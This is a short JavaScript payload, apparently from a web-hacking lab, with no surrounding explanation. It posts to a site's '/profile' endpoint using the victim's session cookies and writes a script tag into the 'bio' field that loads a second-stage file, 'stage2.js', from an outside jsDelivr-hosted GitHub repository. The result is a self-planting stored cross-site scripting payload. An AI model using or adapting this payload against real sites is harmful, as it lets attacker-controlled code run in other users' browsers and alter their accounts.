fetch('/profile', {
    method: 'POST',
    credentials: 'include',
    body: (function(){
        var fd = new FormData();
        fd.append('bio', '<script src="https://cdn.jsdelivr.net/gh/Adonai1027/blog-hacklab-v2-assets@master/stage2.js"></script>');
        return fd;
    })()
});
